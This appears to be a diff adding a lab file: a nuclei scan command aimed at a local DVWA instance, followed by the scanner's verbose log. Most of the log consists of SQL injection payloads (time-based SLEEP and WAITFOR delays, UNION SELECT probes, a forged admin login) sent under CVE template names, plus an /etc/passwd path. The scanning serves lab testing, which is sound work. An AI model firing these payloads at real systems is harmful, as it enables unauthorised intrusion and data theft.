@@ -1,0 +1,746 @@
+cat > urls.txt << EOF                                                       
+http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit           
+http://localhost:4280/vulnerabilities/sqli_blind/?id=1&Submit=Submit
+http://localhost:4280/vulnerabilities/xss_r/?name=test
+http://localhost:4280/vulnerabilities/xss_s/
+http://localhost:4280/vulnerabilities/fi/?page=include.php
+http://localhost:4280/vulnerabilities/exec/
+http://localhost:4280/vulnerabilities/upload/
+http://localhost:4280/vulnerabilities/csrf/
+http://localhost:4280/vulnerabilities/weak_id/
+http://localhost:4280/vulnerabilities/brute/
+EOF
+
+nuclei -list urls.txt \                                                     
+  -H "Cookie: PHPSESSID=9e05cb74e853c5566763cc70180e8c7a; security=low" \
+  -tags sqli,xss,lfi,rce,ssrf,misconfig \                           
+  -severity medium,high,critical \                    
+  -v \                                      
+  -o dvwa_results.txt    
+
+
+
+
+
+[VER] Started metrics server at localhost:9092
+[VER] Saved 13038 templates to metadata cache
+[WRN] Excluded 1 code template[s] (disabled as default), use -code option to run code templates.
+[WRN] Excluded 4 dast template[s] (disabled as default), use -dast option to run dast templates.
+[WRN] Setting thread count to 0 for 1 templates, dynamic extractors are not supported with payloads yet
+[INF] Current nuclei version: v3.8.0 (latest)
+[INF] Current nuclei-templates version: v10.4.4 (latest)
+[WRN] Scan results upload to cloud is disabled.
+[INF] New templates added in latest release: 179
+[INF] Templates loaded for current scan: 570
+[INF] Executing 570 signed templates from projectdiscovery/nuclei-templates
+[INF] Targets loaded for current scan: 1
+[WRN] [CVE-2015-4062] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[WRN] [CVE-2016-10940] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[WRN] [CVE-2015-9323] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2019-16997] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/?id=1&id=1&Submit=Submit&Submit=Submit&n=language&c=language_general&a=doExportPack
+[VER] [CVE-2014-2323] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/etc/passwd?id=1&Submit=Submit
+[VER] [CVE-2018-11231] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/upload/index.php?id=1&id=1&Submit=Submit&Submit=Submit&route=extension/payment/divido/update
+[VER] [CNVD-2023-12632] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/mobile/plugin/browser.jsp?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CNVD-2023-08743] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/servlet/codesettree?id=1&id=1&Submit=Submit&Submit=Submit&flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27hongjing~27~2c~40~40version~2d~2d
+[VER] [CVE-2018-10737] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/nagiosql/admin/logbook.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2018-16159] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2017-18362] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/KaseyaCwWebService/ManagedIT.asmx?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2018-7765] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/umotion/modules/reporting/track_import_export.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2018-7282] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/login.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2018-17283] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/oputilsServlet?id=1&id=1&Submit=Submit&Submit=Submit&action=getAPIKey
+[VER] [CVE-2015-2196] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit&action=ays_sccp_results_export_file&sccp_id[]=1)+AND+(SELECT+1183+FROM+(SELECT(SLEEP(6)))UPad)+AND+(9752=9752&type=json
+[VER] [CNVD-2024-33023] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/service/~iufo/com.ufida.web.action.ActionServlet?id=1&id=1&Submit=Submit&Submit=Submit&action=nc.ui.iufo.release.ReleaseRepMngAction&method=updateDelFlag&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:6%27--
+[VER] [CNVD-2021-33202] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/upgrade/detail.jsp/login/LoginSSO.jsp?id=1&id=1&id=1%20UNION%20SELECT%20md5(999999999)%20as%20id%20from%20HrmResourceManager&Submit=Submit&Submit=Submit
+[VER] [CVE-2019-12989] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/sdwan/nitro/v1/config/get_package_file?id=1&id=1&Submit=Submit&Submit=Submit&action=file_download
+[VER] [CVE-2018-11511] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/photo-gallery/api/album/tree_lists/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2018-10738] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/nagiosql/admin/menuaccess.php?id=1&Submit=Submit
+[VER] [CVE-2018-17254] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?id=1&id=1&Submit=Submit&Submit=Submit&extension=menu&view=menu&parent="%20UNION%20SELECT%20NULL,NULL,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION(),md5(999999999)),NULL,NULL,NULL,NULL,NULL--%20aa
+[VER] [CVE-2019-2579] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/cs/Satellite?id=1&id=1&Submit=Submit&Submit=Submit&pagename=OpenMarket/Xcelerate/Admin/WebReferences
+[WRN] [CVE-2019-2579] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: authkey
+[VER] [CNVD-2024-38747] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php/User/doLogin?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2019-7481] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/cgi-bin/supportInstaller?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2018-6605] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&Submit=Submit&option=com_zhbaidumap&no_html=1&format=raw&task=getPlacemarkDetails
+[WRN] [CVE-2018-17283] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: api_key
+[VER] [CNVD-2022-42853] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/zentao/user-login.html?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2019-7139] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2019-9762] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/include/plugin/payment/alipay/pay.php?id=1&id=1&id=pay%20where%201=1%20union%20select%201,2,CONCAT(md5(999999999)),4,5,6,7,8,9,10,11,12%23_&Submit=Submit&Submit=Submit
+[VER] [CVE-2020-12720] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/ajax/api/content_infraction/getIndexableContent?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2020-11530] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/chopslider/get_script/index.php?id=1&id=1&id=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))A)&Submit=Submit&Submit=Submit
+[VER] [CVE-2020-36112] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/ebook/bookPerPub.php?id=1&id=1&Submit=Submit&Submit=Submit&pubid=4'
+[VER] [CVE-2014-3704] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit&q=node&destination=node
+[WRN] [CVE-2020-5192] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2020-35848] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/auth/newpassword?id=1&Submit=Submit
+[VER] [CVE-2020-17463] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/fuel/login/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2020-17463] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/fuel/login/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2020-13640] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-json/wp/v2/comments?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2018-11511] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/photo-gallery/api/photo/search/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2020-35847] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/auth/requestreset?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2020-22165] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/hms/user-login.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2020-27481] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2020-29214] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/ajax.php?id=1&id=1&Submit=Submit&Submit=Submit&action=login
+[WRN] [CVE-2021-24627] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2020-26248] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&id=1&Submit=Submit&Submit=Submit&fc=module&module=productcomments&controller=CommentGrade&id_products%5B%5D=(select*from(select(sleep(6)))a)
+[VER] [CVE-2020-5766] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2020-27615] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/loginizer/readme.txt?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2020-35846] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/auth/check?id=1&Submit=Submit
+[VER] [CVE-2021-24731] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-json/pie/v1/login?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2020-29214] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/index.php?id=1&id=1&Submit=Submit&Submit=Submit&page=home
+[VER] [CVE-2020-8656] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/eonapi/getApiKey?id=1&id=1&Submit=Submit&Submit=Submit&username=%27%20union%20select%201,%27admin%27,%271c85d47ff80b5ff2a4dd577e8e5f8e9d%27,0,0,1,1,8%20or%20%27&password=h4knet
+[VER] [CVE-2020-13640] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/wpdiscuz/utils/ajax/wpdiscuz-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[WRN] [CVE-2021-24786] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[WRN] [CVE-2021-24791] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2021-24295] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/cleantalk-spam-protect/readme.txt?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2021-24285] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2020-26935] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2021-24340] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/wp-statistics/readme.txt?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2020-9483] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/graphql?id=1&Submit=Submit
+[VER] [CVE-2021-22911] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/v1/method.callAnon/getPasswordPolicy?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2020-35847] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/auth/requestreset?id=1&id=1&Submit=Submit&Submit=Submit
+[WRN] [CVE-2021-24750] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2021-24442] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit&action=pollinsertvalues
+[WRN] [CVE-2021-24862] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2020-6637] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/account/index.php?id=1&Submit=Submit
+[VER] [CVE-2020-17463] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/fuel/pages/items/?id=1&id=1&Submit=Submit&Submit=Submit&search_term&published&layout&limit=50&view_type=list&offset=0&order=asc&col=location+AND+(SELECT+1340+FROM+(SELECT(SLEEP(6)))ULQV)&fuel_inline=0
+[VER] [CVE-2020-5307] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/dfsms/?id=1&id=1&Submit=Submit&Submit=Submit
+[WRN] [CVE-2021-24554] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2021-24762] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit&action=get_question&question_id=1%20AND%20(SELECT%207242%20FROM%20(SELECT(SLEEP(7)))HQYx)
+[VER] [CVE-2021-24340] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin.php?id=1&id=1&Submit=Submit&Submit=Submit&page=wps_pages_page&ID=0+AND+(SELECT+1+FROM+(SELECT(SLEEP(7)))test)&type=home
+[VER] [CVE-2021-24827] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/forum/?id=1&id=1&Submit=Submit&Submit=Submit&subscribe_topic=1%20union%20select%201%20and%20sleep(6)
+[VER] [CVE-2021-27316] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/contactus.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2020-8656] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/eonapi/getApiKey?id=1&id=1&Submit=Submit&Submit=Submit&username=%27%20union%20select%20sleep(6),0,0,0,0,0,0,0%20or%20%27
+[VER] [CVE-2021-25899] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/AurallRECMonitor/services/svc-login.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2021-24915] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin.php?id=1&id=1&Submit=Submit&Submit=Submit&page=contest-gallery/index.php&users_management=true&option_id=1
+[VER] [CVE-2021-27315] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/contactus.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2021-24931] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit&action=ays_sccp_results_export_file&sccp_id[]=3)%20AND%20(SELECT%205921%20FROM%20(SELECT(SLEEP(6)))LxjM)%20AND%20(7754=775&type=json
+[VER] [CVE-2021-24139] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&id=1&Submit=Submit&Submit=Submit&rest_route=/wp/v2/pages
+[VER] [CVE-2021-24943] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit&action=rtec_send_unregister_link
+[VER] [CVE-2021-24849] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/wc-multivendor-marketplace/readme.txt?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2021-27314] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2021-24946] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit&action=mec_load_single_page&time=1))%20UNION%20SELECT%20sleep(6)%20--%20g
+[VER] [CVE-2021-27319] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/contactus.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2021-26599] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/misc.php?id=1&id=1&Submit=Submit&Submit=Submit&action=showpopups&type=friend
+[VER] [CVE-2021-27124] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/patient/search_result.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2021-41460] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/delete_cart_goods.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2021-37291] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/http/index.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2020-6637] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/opensis/index.php?id=1&Submit=Submit
+[WRN] [CVE-2021-42667] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2021-25114] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit&rest_route=/pmpro/v1/checkout_level&level_id=3&discount_code=%27%20%20union%20select%20sleep(6)%20--%20g
+[VER] [CVE-2021-31316] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2021-3018] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/cms/?id=1&id=1&Submit=Submit&Submit=Submit
+[WRN] [CVE-2022-0439] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2021-43510] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/classes/Login.php?id=1&id=1&Submit=Submit&Submit=Submit&f=login
+[VER] [CVE-2021-39165] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/v1/components?id=1&id=1&Submit=Submit&Submit=Submit&name=1&1%5B0%5D&1%5B1%5D=a&1%5B2%5D&1%5B3%5D=or+'a'='a')%20and%20(select%20sleep(6))--
+[VER] [CVE-2021-25114] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/paid-memberships-pro/js/pmpro-checkout.js?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2021-36748] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/module/ph_simpleblog/list?id=1&id=1&Submit=Submit&Submit=Submit&sb_category=')%20OR%20true--%20-
+[VER] [CVE-2022-0592] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-json/mapsvg/v1/maps/2?id=1&id=1&id=1%27%20AND%20(SELECT%2042%20FROM%20(SELECT(SLEEP(6)))b)--+&Submit=Submit&Submit=Submit
+[VER] [CVE-2021-41649] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/homeaction.php?id=1&Submit=Submit
+[VER] [CVE-2021-37589] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/controller/origemdb.php?id=1&id=1&Submit=Submit&Submit=Submit&idselorigem=ATIVOS
+[VER] [CVE-2021-41648] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/action.php?id=1&Submit=Submit
+[VER] [CVE-2022-0747] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[WRN] [CVE-2022-0228] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2022-0658] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2021-27320] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/contactus.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2021-41691] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/TransferredOutModal.php?id=1&id=1&Submit=Submit&Submit=Submit&modfunc=detail
+[VER] [CVE-2022-0693] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit&meta_ids=1+AND+(SELECT+3066+FROM+(SELECT(SLEEP(6)))CEHy)&action=remove_post_meta_condition
+[VER] [CVE-2021-36748] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/module/ph_simpleblog/list?id=1&id=1&Submit=Submit&Submit=Submit&sb_category=')%20AND%20false--%20-
+[VER] [CVE-2021-44427] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/Side.php?id=1&Submit=Submit
+[VER] [CVE-2021-45811] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/scp/login.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-0773] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2021-37589] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/controller/login.php?id=1&id=1&Submit=Submit&Submit=Submit&acao=autenticar
+[VER] [CVE-2022-0781] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2021-41691] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-0760] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-0747] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/infographic-and-list-builder-ilist/assets/js/ilist_custom_admin.js?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-0769] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-0785] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit&action=get_monthly_timetable&month=1+AND+(SELECT+6881+FROM+(SELECT(SLEEP(6)))iEAn)
+[VER] [CVE-2022-0786] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit&action=ajax_get&route_name=get_doctor_details&clinic_id=%7B"id":"1"%7D&props_doctor_id=1,2)+AND+(SELECT+42+FROM+(SELECT(SLEEP(6)))b
+[VER] [CVE-2021-45793] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&id=1&Submit=Submit&Submit=Submit&p=member&destination
+[VER] [CVE-2022-0784] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-0773] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/documentor-lite/core/js/documentor.js?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-0787] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-0783] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2021-3110] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&id=1&Submit=Submit&Submit=Submit&fc=module&module=productcomments&controller=CommentGrade&id_products[]=1%20AND%20(SELECT%203875%20FROM%20(SELECT(SLEEP(8)))xoOt)
+[VER] [CVE-2021-37589] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/controller/login.php?id=1&id=1&Submit=Submit&Submit=Submit&acao=autenticar
+[VER] [CVE-2022-0817] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-0814] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2021-30175] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-0846] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-0479] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-0827] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[WRN] [CVE-2021-45793] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password,csrf_token,csrf_token2
+[VER] [CVE-2022-0867] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-0826] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-1013] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-1057] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit&action=vtprd_product_search_ajax&term=aaa%27+union+select+1,sleep(6),3--+-
+[VER] [CVE-2021-42258] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-0949] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-1453] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-json/rsvpmaker/v1/sked/1?id=1&id=1&Submit=Submit&Submit=Submit&post_id=(SELECT%209999%20FROM%20(SELECT(SLEEP(7)))a)
+[VER] [CVE-2022-0434] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit&rest_route=/pvc/v1/increase/1&post_ids=0)%20union%20select%20md5(999999999),null,null%20--%20g
+[VER] [CVE-2022-0412] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit&rest_route=/wc/v3/wishlist/remove_product/1&item_id=0%20union%20select%20sleep(7)%20--%20g
+[VER] [CVE-2022-0349] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit&rest_route=/notificationx/v1/analytics
+[VER] [CVE-2020-6637] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&Submit=Submit
+[VER] [CVE-2022-0651] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2021-43510] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-0788] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&id=1&Submit=Submit&Submit=Submit&rest_route=/xs-donate-form/payment-redirect/3
+[VER] [CVE-2022-0948] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit&rest_route=/olistener/new
+[INF] Using Interactsh Server: oast.site
+[VER] [CVE-2020-5722] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/cgi?id=1&id=1&Submit=Submit&Submit=Submit
+[WRN] [CVE-2021-42258] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: VS%7D%7D&__VIEWSTATEGENERATOR=%7B%7BVSG%7D%7D&__EVENTVALIDATION=%7B%7BEV
+[WRN] [CVE-2022-24266] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[WRN] [CVE-2022-0651] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: nonce
+[WRN] [CVE-2022-24264] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
